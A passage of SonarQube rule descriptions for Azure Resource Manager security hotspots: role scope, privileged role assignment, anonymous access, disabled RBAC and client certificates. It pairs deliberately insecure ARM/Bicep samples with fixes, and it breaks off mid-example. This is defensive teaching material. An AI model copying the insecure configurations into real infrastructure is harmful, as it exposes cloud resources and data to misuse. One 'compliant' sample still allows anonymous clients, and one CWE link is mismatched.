<p>Financial losses can occur when a malicious user is able to use a paid third-party-provided service. Each users assigned with a bad role will be
able to use it without limit to use the third party service to their own need, including in a way that was not expected.</p>
<p>This additional use will lead to added costs with the Azure service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
environment. This might result in a partial denial of service for all legitimate users.</p>
<h2>How to fix it</h2>
<p>To reduce the risk of intrusion of a compromised owner, it is recommended to limit the number of subscription owners.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Authorization/roleDefinitions",
      "apiVersion": "2022-04-01",
      "properties": {
        "permissions": [
          {
            "actions": ["*"],
            "notActions": []
          }
        ],
        "assignableScopes": [
          "[subscription().id]"
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
targetScope = 'managementGroup'

resource roleDef 'Microsoft.Authorization/roleDefinitions@2022-04-01' = { // Sensitive
  properties: {
    permissions: [
      {
        actions: ['*']
        notActions: []
      }
    ]

    assignableScopes: [
      managementGroup().id
    ]
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Authorization/roleDefinitions",
      "apiVersion": "2022-04-01",
      "properties": {
        "permissions": [
          {
            "actions": ["Microsoft.Compute/*"],
            "notActions": []
          }
        ],
        "assignableScopes": [
          "[subscription().id]"
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
targetScope = 'managementGroup'

resource roleDef 'Microsoft.Authorization/roleDefinitions@2022-04-01' = {
  properties: {
    permissions: [
      {
        actions: ['Microsoft.Compute/*']
        notActions: []
      }
    ]

    assignableScopes: [
      managementGroup().id
    ]
  }
}
</pre>
<h3>Going the extra mile</h3>
<p>Here is a list of recommendations that can be followed regarding good usage of roles:</p>
<ul>
  <li> Apply the least privilege principle by creating a custom role with as few permissions as possible. </li>
  <li> As custom roles can be updated, gradually add atomic permissions when required. </li>
  <li> Limit the assignable scopes of the custom role to a set of Resources or Resource Groups. </li>
  <li> When necessary, use the built-in Owner role instead of a custom role granting subscription owner capabilities. </li>
  <li> Limit the assignments of Owner roles to less than three people or service principals. </li>
</ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Azure Documentation - <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/custom-roles">Azure custom roles</a> </li>
  <li> Azure Documentation - <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices">Best practices for Azure
  RBAC</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6387">
              azureresourcemanager:S6387
            </a>
          </td>
          <td>
            <details>
              <p>Azure RBAC roles can be assigned to users, groups, or service principals. A role assignment grants permissions on a predefined set of resources
called "scope".</p>
<p>The widest scopes a role can be assigned to are:</p>
<ul>
  <li> Subscription: a role assigned with this scope grants access to all resources of this Subscription. </li>
  <li> Management Group: a scope assigned with this scope grants access to all resources of all the Subscriptions in this Management Group. </li>
</ul>
<p>In case of security incidents involving a compromised identity (user, group, or service principal), limiting its role assignment to the narrowest
scope possible helps separate duties and limits what resources are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The user, group, or service principal doesn’t use the entirety of the resources in the scope to operate on a day-to-day basis. </li>
  <li> It is possible to follow the Separation of Duties principle and split the scope into multiple role assignments with a narrower scope. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Limit the scope of the role assignment to a Resource or Resource Group. </li>
  <li> Apply the least privilege principle by assigning roles granting as few permissions as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
targetScope = 'subscription' // Sensitive

resource roleAssignment 'Microsoft.Authorization/roleAssignments@2022-04-01' = {
  name: guid(subscription().id, 'exampleRoleAssignment')
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2018-05-01/subscriptionDeploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Authorization/roleAssignments",
      "apiVersion": "2022-04-01",
      "name": "[guid(subscription().id, 'exampleRoleAssignment')]"
    }
  ]
}
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
targetScope = 'resourceGroup'

resource roleAssignment 'Microsoft.Authorization/roleAssignments@2022-04-01' = {
  name: guid(resourceGroup().id, 'exampleRoleAssignment')
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Authorization/roleAssignments",
      "apiVersion": "2022-04-01",
      "name": "[guid(resourceGroup().id, 'exampleRoleAssignment')]"
    }
  ]
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/scope-overview">Azure Documentation</a> - Understand scope for Azure
  RBAC </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices">Azure Documentation</a> - Best practices for Azure
  RBAC </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6381">
              azureresourcemanager:S6381
            </a>
          </td>
          <td>
            <details>
              <p>Azure Resource Manager offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully
assigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>
<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>
<p>This rule raises an issue when one of the following roles is assigned:</p>
<ul>
  <li> Contributor (b24988ac-6180-42a0-ab88-20f7382dd24c) </li>
  <li> Owner (8e3af657-a8ff-443c-a75c-2fe8c4bcb635) </li>
  <li> User Access Administrator (18d7d88d-d35e-4fb5-a5c3-7773c20a72d9) </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li>
  <li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Limit the assignment of Owner roles to less than 3 people or service principals. </li>
  <li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li>
  <li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Authorization/roleAssignments",
      "apiVersion": "2022-04-01",
      "properties": {
        "description": "Assign the contributor role",
        "principalId": "string",
        "principalType": "ServicePrincipal",
        "roleDefinitionId": "[resourceId('Microsoft.Authorization/roleDefinitions', 'b24988ac-6180-42a0-ab88-20f7382dd24c')]"
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Authorization/roleAssignments@2022-04-01' = {
  scope: tenant()
  properties: {
    description: 'Assign the contributor role'
    principalId: 'string'
    principalType: 'ServicePrincipal'
    roleDefinitionId: resourceId('Microsoft.Authorization/roleAssignments', 'b24988ac-6180-42a0-ab88-20f7382dd24c') // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Authorization/roleAssignments",
      "apiVersion": "2022-04-01",
      "properties": {
        "description": "Assign the reader role",
        "principalId": "string",
        "principalType": "ServicePrincipal",
        "roleDefinitionId": "[resourceId('Microsoft.Authorization/roleDefinitions', 'acdd72a7-3385-48ef-bd42-f606fba81ae7')]"
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="compliant">
resource symbolicname 'Microsoft.Authorization/roleAssignments@2022-04-01' = {
  scope: tenant()
  properties: {
    description: 'Assign the reader role'
    principalId: 'string'
    principalType: 'ServicePrincipal'
    roleDefinitionId: resourceId('Microsoft.Authorization/roleAssignments', 'acdd72a7-3385-48ef-bd42-f606fba81ae7')
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles">Azure Documentation</a> - Azure built-in roles </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices">Azure Documentation</a> - Best practices for Azure
  RBAC </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6380">
              azureresourcemanager:S6380
            </a>
          </td>
          <td>
            <details>
              <p>Allowing anonymous access can reduce an organization’s ability to protect itself against attacks on its Azure resources.</p>
<p>Security incidents may include disrupting critical functions, data theft, and additional Azure subscription costs due to resource overload.</p>
<p>Using authentication coupled with fine-grained authorizations helps bring defense-in-depth and bring traceability to investigators of security
incidents.</p>
<p>Depending on the affected Azure resource, multiple authentication choices are possible: Active Directory Authentication, OpenID implementations
(Google, Microsoft, etc.) or native Azure mechanisms.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Azure resource is essential for the information system infrastructure. </li>
  <li> This Azure resource is essential for mission-critical functions. </li>
  <li> This Azure resource stores or processes sensitive data. </li>
  <li> Compliance policies require access to this resource to be authenticated. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable authentication in this Azure resource, and disable anonymous access.</p>
<p>If only Basic Authentication is available, enable it.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/">App Service</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.Web/sites",
            "apiVersion": "2022-03-01",
            "name": "example"
        }
    ]
}
</pre>
<pre data-diff-id="101" data-diff-type="noncompliant">
resource appService 'Microsoft.Web/sites@2022-09-01' = {
    name: 'example'
    // Sensitive: no authentication defined
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/">API Management</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.ApiManagement/service",
            "apiVersion": "2022-09-01-preview",
            "name": "example"
        }
    ]
}
</pre>
<pre data-diff-id="102" data-diff-type="noncompliant">
resource apiManagementService 'Microsoft.ApiManagement/service@2022-09-01-preview' = {
    name: 'example'
    // Sensitive: no portal authentication defined

    resource apis 'apis@2022-09-01-preview' = {
        name: 'exampleApi'
        properties: {
            path: '/test'
            // Sensitive: no API authentication defined
        }
    }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/">Data Factory</a> Linked Services:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.DataFactory/factories/linkedservices",
            "apiVersion": "2018-06-01",
            "name": "example",
            "properties": {
                "type": "Web",
                "typeProperties": {
                    "authenticationType": "Anonymous"
                }
            }
        }
    ]
}
</pre>
<pre data-diff-id="103" data-diff-type="noncompliant">
resource linkedService 'Microsoft.DataFactory/factories/linkedservices@2018-06-01' = {
    name: 'example'
    properties: {
        type: 'Web'
        typeProperties: {
            authenticationType: 'Anonymous' // Sensitive
        }
    }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/product-categories/storage/">Storage Accounts and Storage Containers</a>:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.Storage/storageAccounts",
            "apiVersion": "2022-09-01",
            "name": "example",
            "properties": {
                "allowBlobPublicAccess": true
            }
        }
    ]
}
</pre>
<pre data-diff-id="104" data-diff-type="noncompliant">
resource storageAccount 'Microsoft.Storage/storageAccounts@2022-09-01' = {
    name: 'example'
    properties: {
        allowBlobPublicAccess: true // Sensitive
    }
}
</pre>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.Storage/storageAccounts",
            "apiVersion": "2022-09-01",
            "name": "example",
            "resources": [
                {
                    "type": "blobServices/containers",
                    "apiVersion": "2022-09-01",
                    "name": "blobContainerExample",
                    "properties": {
                        "publicAccess": "Blob"
                    }
                }
            ]
        }
    ]
}
</pre>
<pre data-diff-id="105" data-diff-type="noncompliant">
resource storageAccount 'Microsoft.Storage/storageAccounts@2022-09-01' = {
    name: 'example'

    resource blobService 'blobServices@2022-09-01' = {
        name: 'default'

        resource containers 'containers@2022-09-01' = {
            name: 'exampleContainer'
            properties: {
                publicAccess: 'Blob' // Sensitive
            }
        }
    }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/cache/">Redis Caches</a>:</p>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.Cache/redis",
            "apiVersion": "2022-06-01",
            "name": "example",
            "properties": {
                "redisConfiguration": {
                    "authnotrequired": "true"
                }
            }
        }
    ]
}
</pre>
<pre data-diff-id="106" data-diff-type="noncompliant">
resource redisCache 'Microsoft.Cache/redis@2023-04-01' = {
    name: 'example'
    location: location
    properties: {
        redisConfiguration: {
            authnotrequired: 'true' // Sensitive
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/">App Services and equivalent</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.Web/sites",
            "apiVersion": "2022-03-01",
            "name": "example",
            "resources": [
                {
                    "type": "config",
                    "apiVersion": "2022-03-01",
                    "name": "authsettingsV2",
                    "properties": {
                        "globalValidation": {
                            "requireAuthentication": true,
                            "unauthenticatedClientAction": "RedirectToLoginPage"
                        }
                    }
                }
            ]
        }
    ]
}
</pre>
<pre data-diff-id="101" data-diff-type="compliant">
resource appService 'Microsoft.Web/sites@2022-09-01' = {
    name: 'example'

    resource authSettings 'config@2022-09-01' = { // Compliant
        name: 'authsettingsV2'
        properties: {
            globalValidation: {
                requireAuthentication: true
                unauthenticatedClientAction: 'AllowAnonymous'
            }
            platform: {
                enabled: true
            }
        }
    }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/">API Management</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.ApiManagement/service",
            "apiVersion": "2022-09-01-preview",
            "name": "example",
            "resources": [
                {
                    "type": "portalsettings",
                    "apiVersion": "2022-09-01-preview",
                    "name": "signin",
                    "properties": {
                        "enabled": true
                    }
                },
                {
                    "type": "apis",
                    "apiVersion": "2022-09-01-preview",
                    "name": "exampleApi",
                    "properties": {
                        "authenticationSettings": {
                            "openid": {
                                "bearerTokenSendingMethods": ["authorizationHeader"],
                                "openidProviderId": "&lt;an OpenID provider ID&gt;"
                            }
                        }
                    }
                }
            ]
        }
    ]
}
</pre>
<pre data-diff-id="102" data-diff-type="compliant">
resource apiManagementService 'Microsoft.ApiManagement/service@2022-09-01-preview' = {
    name: 'example'

    resource portalSettings 'portalsettings@2022-09-01-preview' = {
        name: 'signin'
        properties: {
            enabled: true // Compliant: Sign-in is enabled for portal access
        }
    }

    resource apis 'apis@2022-09-01-preview' = {
        name: 'exampleApi'
        properties: {
            path: '/test'
            authenticationSettings: { // Compliant: API has authentication enabled
                openid: {
                    bearerTokenSendingMethods: ['authorizationHeader']
                    openidProviderId: '&lt;an OpenID provider ID&gt;'
                }
            }
        }
    }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/">Data Factory</a> Linked Services:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.DataFactory/factories/linkedservices",
            "apiVersion": "2018-06-01",
            "name": "example",
            "properties": {
                "type": "Web",
                "typeProperties": {
                    "authenticationType": "Basic"
                }
            }
        }
    ]
}
</pre>
<pre data-diff-id="103" data-diff-type="compliant">
@secure()
@description('The password for authentication')
param password string

resource linkedService 'Microsoft.DataFactory/factories/linkedservices@2018-06-01' = {
    name: 'example'
    properties: {
        type: 'Web'
        typeProperties: {
            authenticationType: 'Basic' // Compliant
            username: 'test'
            password: {
                type: 'SecureString'
                value: password
            }
        }
    }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/product-categories/storage/">Storage Accounts</a>:</p>
<pre data-diff-id="4" data-diff-type="compliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.Storage/storageAccounts",
            "apiVersion": "2022-09-01",
            "name": "example",
            "properties": {
                "allowBlobPublicAccess": false
            }
        }
    ]
}
</pre>
<pre data-diff-id="104" data-diff-type="compliant">
resource storageAccount 'Microsoft.Storage/storageAccounts@2022-09-01' = {
  name: 'example'
  properties: {
    allowBlobPublicAccess: false // Compliant
  }
}
</pre>
<pre data-diff-id="5" data-diff-type="compliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.Storage/storageAccounts",
            "apiVersion": "2022-09-01",
            "name": "example",
            "resources": [
                {
                    "type": "blobServices/containers",
                    "apiVersion": "2022-09-01",
                    "name": "blobContainerExample",
                    "properties": {
                        "publicAccess": "None"
                    }
                }
            ]
        }
    ]
}
</pre>
<pre data-diff-id="105" data-diff-type="compliant">
resource storageAccount 'Microsoft.Storage/storageAccounts@2022-09-01' = {
    name: 'example'

    resource blobService 'blobServices@2022-09-01' = {
        name: 'default'

        resource containers 'containers@2022-09-01' = {
            name: 'exampleContainer'
            properties: {
                publicAccess: 'None' // Compliant
            }
        }
    }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/cache/">Redis Caches</a>:</p>
<pre data-diff-id="6" data-diff-type="compliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.Cache/redis",
            "apiVersion": "2022-06-01",
            "name": "example",
            "properties": {
                "redisConfiguration": {}
            }
        }
    ]
}
</pre>
<pre data-diff-id="106" data-diff-type="compliant">
resource redisCache 'Microsoft.Cache/redis@2023-04-01' = {
    name: 'example'
    location: location
    properties: {
        redisConfiguration: {
            // Compliant: authentication is enabled by default
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6383">
              azureresourcemanager:S6383
            </a>
          </td>
          <td>
            <details>
              <p>Disabling Role-Based Access Control (RBAC) on Azure resources can reduce an organization’s ability to protect itself against access controls being
compromised.</p>
<p>To be considered safe, access controls must follow the principle of least privilege and correctly segregate duties amongst users. RBAC helps
enforce these practices by adapting the organization’s access control needs into explicit role-based policies: It helps keeping access controls
maintainable and sustainable.</p>
<p>Furthermore, RBAC allows operations teams to work faster during a security incident. It helps to mitigate account theft or intrusions by quickly
shutting down accesses.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Azure resource is essential for the information system infrastructure. </li>
  <li> This Azure resource is essential for mission-critical functions. </li>
  <li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Enable Azure RBAC when the Azure resource supports it. </li>
  <li> For Kubernetes clusters, enable Azure RBAC if Azure AD integration is supported. Otherwise, use the built-in Kubernetes RBAC. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/2023-03-01/managedclusters?pivots=deployment-language-arm-template">AKS
Azure Kubernetes Service</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.ContainerService/managedClusters",
      "apiVersion": "2023-03-01",
      "properties": {
        "aadProfile": {
          "enableAzureRBAC": false
        },
        "enableRBAC": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource aks 'Microsoft.ContainerService/managedClusters@2023-03-01' = {
  properties: {
    aadProfile: {
      enableAzureRBAC: false    // Sensitive
    }
    enableRBAC: false           // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.keyvault/2022-07-01/vaults?pivots=deployment-language-arm-template">Key
Vault</a>:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.KeyVault/vaults",
      "apiVersion": "2022-07-01",
      "properties": {
        "enableRbacAuthorization": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource keyVault 'Microsoft.KeyVault/vaults@2022-07-01' = {
  properties: {
    enableRbacAuthorization: false    // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/2023-03-01/managedclusters?pivots=deployment-language-arm-template">AKS
Azure Kubernetes Service</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.ContainerService/managedClusters",
      "apiVersion": "2023-03-01",
      "properties": {
        "aadProfile": {
          "enableAzureRBAC": true
        },
        "enableRBAC": true
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
resource aks 'Microsoft.ContainerService/managedClusters@2023-03-01' = {
  properties: {
    aadProfile: {
      enableAzureRBAC: true     // Compliant
    }
    enableRBAC: true            // Compliant
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.keyvault/2022-07-01/vaults?pivots=deployment-language-arm-template">Key
Vault</a>:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.KeyVault/vaults",
      "apiVersion": "2022-07-01",
      "properties": {
        "enableRbacAuthorization": true
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
resource keyVault 'Microsoft.KeyVault/vaults@2022-07-01' = {
  properties: {
    enableRbacAuthorization: true    // Compliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6382">
              azureresourcemanager:S6382
            </a>
          </td>
          <td>
            <details>
              <p>Disabling certificate-based authentication can reduce an organization’s ability to react against attacks on its critical functions and data.</p>
<p>Azure offers various authentication options to access resources: Anonymous connections, Basic authentication, password-based authentication, and
certificate-based authentication.</p>
<p>Choosing certificate-based authentication helps bring client/host trust by allowing the host to verify the client and vice versa. It cannot be
forged or forwarded by a man-in-the-middle eavesdropper, and the certificate’s private key is never sent over the network so it’s harder to steal than
a password.</p>
<p>In case of a security incident, certificates help bring investigators traceability and allow security operations teams to react faster. For
example, all compromised certificates could be revoked individually, or an issuing certificate could be revoked which causes all the certificates it
issued to become untrusted.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Azure resource is essential for the information system infrastructure. </li>
  <li> This Azure resource is essential for mission-critical functions. </li>
  <li> Compliance policies require access to this resource to be authenticated with certificates. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable certificate-based authentication.</p>
<h2>Sensitive Code Example</h2>
<p>Where the use of client certificates is controlled by a boolean value, such as:</p>
<ul>
  <li> <code>Microsoft.Web/sites</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites?pivots=deployment-language-arm-template#siteproperties">clientCertEnabled</a> </li>
  <li> <code>Microsoft.SignalRService/signalR</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.signalrservice/signalr?pivots=deployment-language-arm-template#signalrtlssettings">tls → clientCertEnabled</a> </li>
  <li> <code>Microsoft.SignalRService/webPubSub</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.signalrservice/webpubsub?pivots=deployment-language-arm-template#webpubsubtlssettings-1">tls → clientCertEnabled</a> </li>
  <li> <code>Microsoft.ApiManagement/service/gateways/hostnameConfigurations</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/gateways/hostnameconfigurations?pivots=deployment-language-arm-template#gatewayhostnameconfigurationcontractproperties">negotiateClientCertificate</a> </li>
</ul>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.SignalRService/webPubSub",
      "apiVersion": "2020-07-01-preview",
      "name": "example",
      "properties": {
        "tls": {
          "clientCertEnabled": false
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="noncompliant">
resource example 'Microsoft.SignalRService/webPubSub@2020-07-01-preview' = {
  name: 'example'
  properties: {
    tls: {
      clientCertEnabled: false // Sensitive
    }
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2015-08-01",
      "name": "example",
      "properties": {
        "clientCertEnabled": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="12" data-diff-type="noncompliant">
resource example 'Microsoft.Web/sites@2015-08-01' = {
  name: 'example'
  properties: {
    clientCertEnabled: false // Sensitive
  }
}
</pre>
<p>Where the use of client certificates can be made optional, such as:</p>
<ul>
  <li> <code>Microsoft.Web/sites</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites?pivots=deployment-language-arm-template#siteproperties">clientCertMode</a> </li>
  <li> <code>Microsoft.App/containerApps</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.app/containerapps?pivots=deployment-language-arm-template#ingress">configuration →
  ingress → clientCertificateMode</a> </li>
</ul>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2015-08-01",
      "name": "example",
      "properties": {
        "clientCertEnabled": true,
        "clientCertMode": "Optional"
      }
    }
  ]
}
</pre>
<pre data-diff-id="13" data-diff-type="noncompliant">
resource example 'Microsoft.Web/sites@2015-08-01' = {
